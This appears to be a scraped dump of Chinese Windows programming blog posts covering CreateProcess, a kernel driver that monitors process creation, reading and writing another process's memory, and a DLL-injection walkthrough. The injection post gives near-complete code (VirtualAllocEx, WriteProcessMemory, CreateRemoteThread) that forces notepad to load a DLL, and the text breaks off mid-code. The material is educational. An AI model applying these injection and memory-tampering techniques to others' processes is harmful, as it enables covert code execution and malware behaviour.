lpProcessInformation，是一个PROCESS_INFOMATION结构体指针。PROCESS_INFOMATION的定义为： 123456typedef struct _PROCESS_INFORMATION { HANDLE hProcess; HANDLE hThread; DWORD dwProcessId; DWORD dwThreadId;} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION; CreateProcessA会创建一个进程和它的主线程，hProcess就是这个进程的句柄，hThread就是进程的主线程的句柄。dwProcessId和dwThreadId分别为进程和它的主线程的标识符ID。 简单示例中传入的参数为&amp;pi，因此就可以通过pi得到创建的进程以及其主线程的句柄和标识符了。添加如下代码，打印子进程的进程标识符： 1printf(&quot;Child Process ID: %d\\n&quot;, pi.dwProcessId); 运行parent： 1234&gt; parentChild Process ID: 13816argv[0]: abcdefgargv[1]: !@#$%^&amp; 父进程等待子进程执行结束在Linux中，父进程可以通过wait系统调用等待子进程执行完毕。Windows中也有类似的功能，即WaitForSingleObject。 WaitForSingleObject的函数原型为： 1234DWORD WaitForSingleObject( HANDLE hHandle, DWORD dwMilliseconds); 需要传入两个参数，hHandle为对象的句柄，dwMilliseconds为等待的毫秒数。如果对象结束，或对象没有结束但经过了dwMilliseconds毫秒，则等待完毕，进程继续执行后面的语句。 父进程可以通过PROCESS_INFORMATION结构体获取子进程的进程句柄，然后再将子进程的句柄传入WaitForSingleObject中，即可等待子进程执行完毕。 在打印子进程ID前，添加语句： 1WaitForSingleObject(pi.hProcess, 10000); 再运行parent，得到的结果为： 1234&gt; parentargv[0]: abcdefgargv[1]: !@#$%^&amp;Child Process ID: 3944 说明父进程会等待子进程child执行完毕后再打印子进程的ID。 关闭PROCESS_INFORMATION中的句柄一个更好的习惯是在PROCESS_INFORMATION中的句柄使用完毕后，用CloseHandle将其关闭。 If the function succeeds, be sure to call the CloseHandle function to close the hProcess and hThread handles when you are finished with them. Otherwise, when the child process exits, the system cannot clean up the process structures for the child process because the parent process still has open handles to the child process. However, the system will close these handles when the parent process terminates, so the structures related to the child process object would be cleaned up at this point. 在parent.c的末尾添加CloseHandle代码： 12CloseHandle(pi.hProcess);CloseHandle(pi.hThread); 最终，得到的完整的parent.c代码为： 123456789101112131415161718192021222324252627282930#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;#include &lt;errhandlingapi.h&gt;#include &lt;synchapi.h&gt;#include &lt;handleapi.h&gt;int main() { STARTUPINFO si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si); BOOL result = CreateProcessA( &quot;child.exe&quot;, //lpApplicationName &quot;abcdefg !@#$%^&amp;&quot;, //lpCommandLine NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformation if(!result) { printf(&quot;Create Process Failed! Error Code:%d\\n&quot;, GetLastError()); return -1; } WaitForSingleObject(pi.hProcess, 10000); printf(&quot;Child Process ID: %d\\n&quot;, pi.dwProcessId); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;}","link":"/2021/01/17/windows-createprocess/"},{"title":"利用Windows事件通知机制监控进程创建","text":"利用Windows内核提供的事件通知机制，可以对系统内某一类事件的操作进行监控。比如，可以通过PsSetCreateProcessNotifyRoutineEx函数注册一个创建进程的通知，从而实现对进程创建的监控。 本文主要参考《Windows内核编程》第21章。 PsSetCreateProcessNotifyRoutineEx的用法PsSetCreateProcessNotifyRoutineEx的函数原型为： 1234NTSTATUS PsSetCreateProcessNotifyRoutineEx( PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine, BOOLEAN Remove); 其中NotifyRoutine为一个函数指针，这个函数的原型被规定为： 12345678PCREATE_PROCESS_NOTIFY_ROUTINE_EX PcreateProcessNotifyRoutineEx;void PcreateProcessNotifyRoutineEx( PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo){...} 这个函数被称为通知例程，只要发生了“进程创建或销毁”这一事件，这个PcreateProcessNotifyRoutineEx就会被调用一次，这样就实现了对进程创建的监控。 另一个参数为Remove，Remove为FALSE时，表示要进行注册一个通知；Remove为TRUE，表示要移除这个通知。因此，一般会在DriverEntry，即驱动的入口函数中调用PsSetCreateProcessNotifyRoutineEx时将Remove设置为FALSE；在DriverUnload，即驱动的卸载函数中再调用一次PsSetCreateProcessNotifyRoutineEx，此时需要将Remove设置为FALSE。 通知例程函数的参数说明通知例程函数有三个形参，通过这三个形参，就可以知道要创建（或销毁）的进程的一些基本信息。 ProcessId为要创建的进程对应的进程ID。 根据CreateInfo可以判断当前进行的是进程的创建还是销毁操作。如果要进行进程销毁操作，则CreateInfo的值会是NULL。因此，通过判断CreateInfo是否为NULL，可以得知要进行的操作是进程创建还是进程销毁。 进行进程创建操作时，CreateInfo的结构体定义为： 1234567891011121314151617typedef struct _PS_CREATE_NOTIFY_INFO { SIZE_T Size; union { ULONG Flags; struct { ULONG FileOpenNameAvailable : 1; ULONG IsSubsystemProcess : 1; ULONG Reserved : 30; }; }; HANDLE ParentProcessId; CLIENT_ID CreatingThreadId; struct _FILE_OBJECT *FileObject; PCUNICODE_STRING ImageFileName; PCUNICODE_STRING CommandLine; NTSTATUS CreationStatus;} PS_CREATE_NOTIFY_INFO, *PPS_CREATE_NOTIFY_INFO; 从中可以得到进程的名字、参数、父进程ID等信息。 进程监控驱动程序编写函数和全局变量声明在程序的最开始先声明几个需要用到的函数和全局变量： 1234567#include &lt;ntddk.h&gt;/*函数原型声明*/VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject); //驱动卸载函数VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo); //通知例程BOOLEAN g_bSuccRegister = FALSE; //用于记录是否成功注册通知例程 DriverEntry12345678910111213NTSTATUS DriverEntry(__in struct _DRIVER_OBJECT* DriverObject, __in PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); NTSTATUS nStatus = STATUS_UNSUCCESSFUL; do { DriverObject-&gt;DriverUnload = DriverUnload; if (STATUS_SUCCESS != PsSetCreateProcessNotifyRoutineEx(ProcessNotify, FALSE)) { break; } g_bSuccRegister = TRUE; nStatus = STATUS_SUCCESS; } while (FALSE); return nStatus;} DriverEntry的主要功能是调用PsSetCreateProcessNotifyRoutineEx，将ProcessNotify函数注册为进程创建的通知例程。 DriverUnload1234567VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject) { UNREFERENCED_PARAMETER(DriverObject); if (g_bSuccRegister) { PsSetCreateProcessNotifyRoutineEx(ProcessNotify, TRUE); } return;} 在卸载驱动模块时，需要再调用一次PsSetCreateProcessNotifyRoutineEx，将之前注册的事件通知移除。 ProcessNotify这一函数为进程创建或销毁的通知例程，每当发生进程创建或进程销毁时，这一函数都会被调用，内容为： 1234567891011VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo) { UNREFERENCED_PARAMETER(Process); if (NULL == CreateInfo) { //进程结束 DbgPrint(&quot;[Destroy] [PID = 0x%x] [CurrentPID = 0x%x]\\n&quot;, ProcessId, PsGetCurrentProcessId()); return; } //进程创建 DbgPrint(&quot;[Create] [PID = 0x%x, Name=%wZ] [CurrentPID = 0x%x] [PPID = 0x%x]\\n&quot;, ProcessId, CreateInfo-&gt;ImageFileName, PsGetCurrentProcessId(), CreateInfo-&gt;ParentProcessId); return;} 函数会打印和进程有关的一些信息。 完整代码1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;ntddk.h&gt;/*函数原型声明*/VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject); //驱动卸载函数VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo); //通知例程BOOLEAN g_bSuccRegister = FALSE; //用于记录是否成功注册通知例程NTSTATUS DriverEntry(__in struct _DRIVER_OBJECT* DriverObject, __in PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); NTSTATUS nStatus = STATUS_UNSUCCESSFUL; do { DriverObject-&gt;DriverUnload = DriverUnload; if (STATUS_SUCCESS != PsSetCreateProcessNotifyRoutineEx(ProcessNotify, FALSE)) { break; } g_bSuccRegister = TRUE; nStatus = STATUS_SUCCESS; } while (FALSE); return nStatus;}VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject) { UNREFERENCED_PARAMETER(DriverObject); if (g_bSuccRegister) { PsSetCreateProcessNotifyRoutineEx(ProcessNotify, TRUE); } return;}VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo) { UNREFERENCED_PARAMETER(Process); if (NULL == CreateInfo) { //进程结束 DbgPrint(&quot;[Destroy] [PID = 0x%x] [CurrentPID = 0x%x]\\n&quot;, ProcessId, PsGetCurrentProcessId()); return; } //进程创建 DbgPrint(&quot;[Create] [PID = 0x%x, Name=%wZ] [CurrentPID = 0x%x] [PPID = 0x%x]\\n&quot;, ProcessId, CreateInfo-&gt;ImageFileName, PsGetCurrentProcessId(), CreateInfo-&gt;ParentProcessId); return;} 编译时需要加上/INTEGRITYCHECK使用Visual Studio对驱动进行编译时，需要加上/INTEGRITYCHECK选项，否则PsSetCreateProcessNotifyRoutineEx会返回STATUS_ACCESS_DENIED错误码。 运行结果在虚拟机中禁用驱动程序强制签名，然后运行驱动，打开DbgView查看打印的结果： 上图为部分打印结果，驱动成功监测到notepad进程的创建和销毁。 通知例程的上下文在创建和销毁进程时，通知例程都会被调用，那么通知例程是在哪个进程中被调用的呢？根据《Windows内核编程》的说法： 对于进程创建通知来说，通知例程运行在创建该进程的线程上下文中，如果线程A调用应用层CreateProcess函数创建子进程B，那么通知例程就运行在A线程的上下文中。对于进程结束通知来说，通知例程运行在该进程中最后一个退出的线程的上下文中（一般是主线程）。 根据上面的运行结果也可以看出，当进程创建时，调用PsGetCurrentProcessId得到的进程ID（CurrentPID）是和父进程的ID相同的；而当进程结束时，PsGetCurrentProcessId得到的进程ID是和要销毁的进程ID相同的。不过也有进程创建时，CurrentPID和PPID不相等的情况。 进程是32位还是64位在内核驱动中，要想知道进程是32位还是64位，可以使用ZwQueryInformationProcess函数，但这个函数需要传入进程的句柄，所以在这之前要先想办法获取进程的句柄。现在已经有了指向进程对象的指针，类型为PEPROCESS，变量名为Process，因此可以使用ObOpenObjectByPointer得到这个进程对象的一个句柄： 12345status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, NULL, 0, NULL, KernelMode, &amp;hProcess); //获取进程句柄if (STATUS_SUCCESS != status) { DbgPrint(&quot;ObOpenObjectByPointer Failed:0x%x&quot;, status); break;} 接下来使用ZwQueryInformationProcess，但发现头文件中并没有这个函数，因此要使用MmGetSystemRoutineAddress找到这个函数。首先在文件开头定义全局变量存储ZwQueryInformationProcess的地址： 12345678typedef NTSTATUS(*ZWQUERYINFORMATIONPROCESS) ( __in HANDLE ProcessHandle, __in PROCESSINFOCLASS ProcessInformationClass, __out_bcount(ProcessInformationLength) PVOID ProcessInformation, __in ULONG ProcessInformationLength, __out_opt PULONG ReturnLength);ZWQUERYINFORMATIONPROCESS g_pZwQueryInformationProcess = NULL; //ZwQueryInformationProcess函数地址 在DriverEntry中添加代码，对g_pZwQueryInformationProcess变量赋值： 1234567UNICODE_STRING uFuncName = { 0 };DriverObject-&gt;DriverUnload = DriverUnload;RtlInitUnicodeString(&amp;uFuncName, L&quot;ZwQueryInformationProcess&quot;);g_pZwQueryInformationProcess = (ZWQUERYINFORMATIONPROCESS)MmGetSystemRoutineAddress(&amp;uFuncName);if (NULL == g_pZwQueryInformationProcess) { break;} 最后在通知例程中添加代码，使用ZwQueryInformationProcess判断其是32位进程还是64位进程： 1234567891011status = g_pZwQueryInformationProcess(hProcess, ProcessWow64Information, &amp;isWOW64, sizeof(isWOW64), NULL);if (STATUS_SUCCESS != status) { DbgPrint(&quot;ZwQueryInformationProcess Failed:0x%x&quot;, status); break;}if (isWOW64) { //32位进程 DbgPrint(&quot;[Detail 0x%x] 32bit&quot;, ProcessId);}else { //64位进程 DbgPrint(&quot;[Detail 0x%x] 64bit&quot;, ProcessId);} 添加了上面这些代码后，源代码为： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;ntifs.h&gt;#include &lt;ntddk.h&gt;/*函数原型声明*/VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject); //驱动卸载函数VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo); //通知例程typedef NTSTATUS(*ZWQUERYINFORMATIONPROCESS) ( __in HANDLE ProcessHandle, __in PROCESSINFOCLASS ProcessInformationClass, __out_bcount(ProcessInformationLength) PVOID ProcessInformation, __in ULONG ProcessInformationLength, __out_opt PULONG ReturnLength);/*全局变量定义*/ZWQUERYINFORMATIONPROCESS g_pZwQueryInformationProcess = NULL; //ZwQueryInformationProcess函数地址BOOLEAN g_bSuccRegister = FALSE; //用于记录是否成功注册通知例程NTSTATUS DriverEntry(__in struct _DRIVER_OBJECT* DriverObject, __in PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); NTSTATUS nStatus = STATUS_UNSUCCESSFUL; do { UNICODE_STRING uFuncName = { 0 }; DriverObject-&gt;DriverUnload = DriverUnload; RtlInitUnicodeString(&amp;uFuncName, L&quot;ZwQueryInformationProcess&quot;); g_pZwQueryInformationProcess = (ZWQUERYINFORMATIONPROCESS)MmGetSystemRoutineAddress(&amp;uFuncName); if (NULL == g_pZwQueryInformationProcess) { break; } if (STATUS_SUCCESS != PsSetCreateProcessNotifyRoutineEx(ProcessNotify, FALSE)) { break; } g_bSuccRegister = TRUE; nStatus = STATUS_SUCCESS; } while (FALSE); return nStatus;}VOID DriverUnload(__in struct _DRIVER_OBJECT* DriverObject) { UNREFERENCED_PARAMETER(DriverObject); if (g_bSuccRegister) { PsSetCreateProcessNotifyRoutineEx(ProcessNotify, TRUE); } return;}VOID ProcessNotify(__inout PEPROCESS Process, __in HANDLE ProcessId, __in_opt PPS_CREATE_NOTIFY_INFO CreateInfo) { UNREFERENCED_PARAMETER(Process); if (NULL == CreateInfo) { //进程结束 DbgPrint(&quot;[Destroy] [PID = 0x%x] [CurrentPID = 0x%x]\\n&quot;, ProcessId, PsGetCurrentProcessId()); return; } //进程创建 DbgPrint(&quot;[Create] [PID = 0x%x, Name=%wZ] [CurrentPID = 0x%x] [PPID = 0x%x]\\n&quot;, ProcessId, CreateInfo-&gt;ImageFileName, PsGetCurrentProcessId(), CreateInfo-&gt;ParentProcessId); HANDLE hProcess = NULL; NTSTATUS status = STATUS_UNSUCCESSFUL; ULONG_PTR isWOW64 = 0; do { status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, NULL, 0, NULL, KernelMode, &amp;hProcess); //获取进程句柄 if (STATUS_SUCCESS != status) { DbgPrint(&quot;ObOpenObjectByPointer Failed:0x%x&quot;, status); break; } status = g_pZwQueryInformationProcess(hProcess, ProcessWow64Information, &amp;isWOW64, sizeof(isWOW64), NULL); if (STATUS_SUCCESS != status) { DbgPrint(&quot;ZwQueryInformationProcess Failed:0x%x&quot;, status); break; } if (isWOW64) { //32位进程 DbgPrint(&quot;[Detail 0x%x] 32bit&quot;, ProcessId); } else { //64位进程 DbgPrint(&quot;[Detail 0x%x] 64bit&quot;, ProcessId); } } while (FALSE); if (NULL != hProcess) { ZwClose(hProcess); hProcess = NULL; } return;} 运行结果如下： 说明驱动程序可以分辨出32位和64位进程。","link":"/2021/04/05/windows-kernel-create-process-notify/"},{"title":"Windows读写其他进程内存的方法","text":"本文记录了如何使用Windows提供的ReadProcessMemory和WriteProcessMemory对其他进程的内存空间进行读写操作。 ReadProcessMemory和WriteProcessMemory的函数原型1234567BOOL ReadProcessMemory( HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead); 1234567BOOL WriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten); Microsoft的文档中有对每个参数的详细解释： ReadProcessMemory function (memoryapi.h) WriteProcessMemory function (memoryapi.h) 使用这两个函数，需要传入目标进程的句柄、想要读写内存的基地址、读写内存的大小等信息。在通过CreateProcess创建子进程时，可以通过PROCESS_INFORMATION结构体得到子进程的句柄。因此，先来看读写子进程内存的方法。 读写子进程内存编写子进程子进程的功能为打印全局变量i的值，并使变量i不断自增。 12345678910#include &lt;stdio.h&gt;#include &lt;synchapi.h&gt;int i;int main() { while(1) { printf(&quot;%d. &quot;, i++); Sleep(100); }} 运行结果为： 12&gt; child0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 35. 36. 37. 38. 39. 40. 41. 42. 43. 44. 45. 46. 47. 48. 49. 编写父进程读取子进程内存父进程首先要通过CreateProcess创建子进程，然后通过PROCESS_INFORMATION结构体获取子进程的句柄。之后，再将句柄传入ReadProcessMemory，即可读取子进程的内存。 如果要让父进程修改子进程的全局变量i，则需要知道i的内存地址，这可以通过反汇编工具（如IDA Pro）获取。我使用的编译器会将全局变量i的内存地址设置为0x407970，不同编译器编译得到的child中i的内存地址可能不同。 12345678910111213141516171819202122232425262728293031323334353637#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;#include &lt;errhandlingapi.h&gt;#include &lt;synchapi.h&gt;#include &lt;handleapi.h&gt;#include &lt;memoryapi.h&gt;int main() { //创建子进程 STARTUPINFO si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si); BOOL result = CreateProcessA( &quot;child.exe&quot;, //lpApplicationName NULL, //lpCommandLine NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, //lpStartupInfo &amp;pi); //lpProcessInformation if(!result) { printf(&quot;Create Process Failed! Error Code:%d\\n&quot;, GetLastError()); return -1; } //读写子进程全局变量i，地址为0x407970 int childi; while(1) { ReadProcessMemory(pi.hProcess, (void *)0x407970, &amp;childi, sizeof(int), NULL); printf(&quot;\\nparent read child i: %d\\n&quot;, childi); Sleep(600); } CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;} 运行parent： 12345678910111213&gt; parentparent read child i: 00. 1. 2. 3. 4. 5.parent read child i: 66. 7. 8. 9. 10. 11.parent read child i: 1212. 13. 14. 15. 16. 17.parent read child i: 1818. 19. 20. 21. 22. 23.parent read child i: 2424. 25. 26. 27. 28. 29.parent read child i: 30 可以看出parent成功读取了child中变量i的内容。 添加修改子进程内存的代码使用WriteProcessMemory可以修改子进程中i的值。在parent中添加代码： 12345678910//读写子进程全局变量i，地址为0x407970int childi;while(1) { ReadProcessMemory(pi.hProcess, (void *)0x407970, &amp;childi, sizeof(int), NULL); if(childi &gt; 20) { childi = 0; WriteProcessMemory(pi.hProcess, (void *)0x407970, &amp;childi, sizeof(int), NULL); } Sleep(600);} 当读取到的i大于20时，就将i清零，并写入子进程的内存当中。运行parent： 12345&gt; parent0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 0. 1. 2. 3. 4. 5. 6. i大于20后不久就会被清零。之所以没有立即清零是因为parent中有一个Sleep(600);。 读取其他进程的内存读写其他进程内存需要首先获取其句柄，这可以通过函数OpenProcess得到。 OpenProcess函数原型12345HANDLE OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId); 因此，知道了目标进程的进程标识符ProcessId，就可以获得其句柄了。 OpenProcess function (processthreadsapi.h) 编写目标进程代码目标进程会先调用GetCurrentProcessId获取自身的进程标识符并打印出来，然后就开始不断打印全局变量i的值并将i加一。 123456789101112#include &lt;stdio.h&gt;#include &lt;synchapi.h&gt;#include &lt;processthreadsapi.h&gt;int i;int main() { printf(&quot;My Process ID: %d\\n&quot;, GetCurrentProcessId()); while(1) { printf(&quot;%d. &quot;, i++); Sleep(100); }} 编写修改器代码修改器会先根据目标进程的ProcessId获取句柄，然后再调用ReadProcessMemory和WriteProcessMemory读写目标进程的全局变量i，当i大于20时清零。 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;synchapi.h&gt;#include &lt;memoryapi.h&gt;#include &lt;errhandlingapi.h&gt;int main(int argc, char **argv) { if(argc &lt; 2) { printf(&quot;Usage: modifier [pid]\\n&quot;); return -1; } //OpenProcess获得目标进程的句柄 int targetPid = atoi(argv[1]); HANDLE hTarget = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, targetPid); if(NULL == hTarget) { printf(&quot;Open Process Failed! Error Code: %d\\n&quot;, GetLastError()); return -1; } //读写目标进程全局变量i，地址为0x407970 int targetI; BOOL result; while(1) { result = ReadProcessMemory(hTarget, (void *)0x407970, &amp;targetI, sizeof(int), NULL); if(!result) { printf(&quot;Read Process Memory Failed! Error Code: %d\\n&quot;, GetLastError()); return -1; } else if(targetI &gt; 20) { targetI = 0; result = WriteProcessMemory(hTarget, (void *)0x407970, &amp;targetI, sizeof(int), NULL); if(!result) { printf(&quot;Write Process Memory Failed! Error Code: %d\\n&quot;, GetLastError()); return -1; } } Sleep(600); } return 0;} 运行结果首先运行目标程序program，得到其进程标识符为4372，然后再运行修改器程序并传入参数4372，即modifier 4372，一段时间后终止修改器。最终，program的打印结果如下： 12345678910&gt; programMy Process ID: 43720. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 35. 36. 37. 38. 39. 40. 41. 42. 43. 44. 45. 46. 47. 48. 49. 50. 51. 52. 53. 54. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 0. 1. 2. 3. 4. 5. 6. 7. 8. 9. 10. 11. 12. 13. 14. 15. 16. 17. 18. 19. 20. 21. 22. 23. 24. 25. 26. 27. 28. 29. 30. 31. 32. 33. 34. 35. 36. 37. 38. 39. 40. 41. 42. 43. 44. 45. 46. 47. 48. 49. 50. 51. 52. 53. 54. 55. 56. 57. 全局变量i一开始会不断自增，当修改器开始运行后，i的值便被清零，然后当i的值超过20后也会被清零。修改器停止运行后，i的值又会不断自增而不会被清零。","link":"/2021/01/19/windows-modify-process-memory/"},{"title":"使用CreateRemoteThread向目标进程注入DLL","text":"在之前的文章中提到，如果要使用CreateRemoteThread在目标进程中创建远程线程： 在正常使用时，远程线程的代码是在目标进程中本来就有的。 是否有一种手段，使得在目标进程中创建的远程线程，执行任意自己想要执行的代码呢？一种方法是通过DLL注入来实现。 假如当前用户正在运行一个记事本notepad进程，那么，其他进程就可以通过CreateRemoteThread在notepad进程中创建一个线程。不过通常情况下，线程中执行的代码是notepad进程中本来就有的。现在想让notepad进程执行下述代码： 1234char str[100];sprintf(str, &quot;pid: %d&quot;, GetCurrentProcessId());while(1) MessageBoxA(NULL, str, &quot;DLL Inject&quot;, MB_ICONSTOP | MB_OK); notepad本身不可能有这种无限弹窗的代码，所以没法直接通过CreateRemoteThread创建线程执行它们。通过DLL注入的方式，可以让notepad进程最终能执行上面这个无限弹窗的代码。 编写具有DllMain的DLL动态链接库dll文件中，通常包含一些其他代码可能会使用到的函数和数据。其他程序可以通过LoadLibraryA函数加载dll文件，然后就能使用dll中的函数了。 一些dll中会有一个DllMain函数，它被称为dll的入口点。当dll被装载时，DllMain中的代码就会被执行。Microsoft的文档：DllMain entry point 当自己编写dll的代码时，也可以自定义DllMain函数的内容。比如，将DllMain函数的内容写成无限弹窗的代码： 1234567891011#include &lt;windef.h&gt;#include &lt;winuser.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;BOOL WINAPI DllMain() { char str[100]; sprintf(str, &quot;pid: %d&quot;, GetCurrentProcessId()); while(1) MessageBoxA(NULL, str, &quot;DLL Inject&quot;, MB_ICONSTOP | MB_OK);} 将上述代码保存在文件0.c中。接下来，将其编译成0.dll。我使用的mingw-gcc将其编译成dll的命令为： 12gcc -c 0.c -o 0.ogcc -shared 0.o -o 0.dll 可以写个代码测试一下，看看加载这个dll文件是否会执行DllMain函数中的语句： 123456#include &lt;libloaderapi.h&gt;int main() { HMODULE h0 = LoadLibraryA(&quot;0.dll&quot;); return 0;} 编译运行，程序立刻弹窗，说明加载dll文件的行为确实是可以导致DllMain函数被执行的。 编写程序实现DLL注入现在，已经有了一个0.dll文件。当程序尝试加载这个dll文件时，会执行DllMain函数中的内容，发生无限弹窗。于是，现在的目标就变成了，让目标进程notepad加载这个0.dll文件。 将字符串&quot;D:\\0.dll&quot;传入notepad内存空间中为了方便起见，使用绝对路径加载dll文件。所以，先把0.dll复制到D盘根目录下，这样一来它的绝对路径就变成了&quot;D:\\0.dll&quot;。 字符串&quot;D:\\0.dll&quot;是LoadLibraryA函数的参数，要想办法让这个字符串出现在notepad的内存空间当中。可以通过以下步骤达成这一点： 使用OpenProcess获得目标进程notepad的句柄 使用VirtualAllocEx在目标进程中申请一块内存，并得到这块内存的起始地址 使用WriteProcessMemory将字符串&quot;D:\\0.dll&quot;写入这块内存当中 12345678910111213141516171819//获取目标进程句柄int pid = atoi(argv[1]);HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);if(NULL == hProcess) { printf(&quot;OpenProcess Error: %d\\n&quot;, GetLastError()); return -1;}//在目标进程中申请一块内存空间，写入字符串&quot;D:\\0.dll&quot;void *dllNamePtr = VirtualAllocEx(hProcess, NULL, 10, MEM_COMMIT, PAGE_READWRITE);if(NULL == dllNamePtr) { printf(&quot;VirtualAllocEx Error: %d\\n&quot;, GetLastError()); return -1;}BOOL result = WriteProcessMemory(hProcess, dllNamePtr, &quot;D:\\\\0.dll&quot;, 9, NULL);if(!result) { printf(&quot;WriteProcessMemory Error: %d\\n&quot;, GetLastError()); return -1;}printf(&quot;\\&quot;D:\\\\0.dll\\&quot; String Address: 0x%p\\n&quot;, dllNamePtr); 某次执行这段代码，申请到的内存地址为0x000001CE24A90000，使用x64dbg查看notepad中的这块内存： 说明成功写入了字符串&quot;D:\\0.dll&quot;。 获取LoadLibraryA的内存地址首先，通过GetModuleHandleA获取kernel32.dll模块的句柄，然后再使用GetProcAddress获取LoadLibraryA的地址： 123//找到LoadLibraryA的地址void *funcAddr = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;);printf(&quot;LoadLibraryA Address: 0x%p\\n&quot;, funcAddr); 有人可能会担心，通过上述方法，找到的是自身进程中LoadLibraryA的内存地址，并不是目标进程notepad中LoadLibraryA的地址。不过通常情况下，LoadLibraryA在不同进程中的地址是相同的。Dll injection - Wikipedia中提到： kernel32.dll is mapped to the same address in almost all processes. Therefore LoadLibrary (which is a function of kernel32.dll) is mapped to the same address as well. 所以，这种方法得到的LoadLibraryA的地址可以认为就是目标进程notepad中LoadLibraryA的地址。比如在某次执行上面的代码，得到的LoadLibraryA的地址为0x00007FFFC185EBB0，x64dbg找到进程notepad在这里的语句： 说明这个地方确实就是LoadLibraryA的入口点。 创建远程线程调用LoadLibraryA(&quot;D:\\0.dll&quot;)CreateRemoteThread中，线程函数只允许有一个参数，而LoadLibraryA恰好就是只需要一个参数。而且，经过之前的操作，已经知道了在notepad进程中LoadLibraryA的地址，以及字符串&quot;D:\\0.dll&quot;的地址，于是就可以通过CreateRemoteThread创建线程调用LoadLibraryA了。 1234567891011//创建远程线程调用LoadLibraryA(&quot;D:\\0.dll&quot;)，加载0.dllHANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, funcAddr, dllNamePtr, 0, NULL);WaitForSingleObject(hThread, INFINITE);DWORD exitCode;GetExitCodeThread(hThread, &amp;exitCode); //获取LoadLibraryA的返回值if(!exitCode) { printf(&quot;LoadLibraryA Failed!\\n&quot;); return -1;}printf(&quot;Inject Complete.\\n&quot;);return 0; 一旦notepad加载0.dll，就会执行其中的DllMain函数，而DllMain的内容又是无限弹窗程序。这样一来，notepad就会开始无限弹窗了。 完整代码及运行结果12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;windows.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv) { if(argc &lt; 2) { printf(&quot;Usage: injectdll [pid]\\n&quot;); return -1; } //获取目标进程句柄 int pid = atoi(argv[1]); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); if(NULL == hProcess) { printf(&quot;OpenProcess Error: %d\\n&quot;, GetLastError()); return -1; } //在目标进程中申请一块内存空间，写入字符串&quot;D:\\0.dll&quot; void 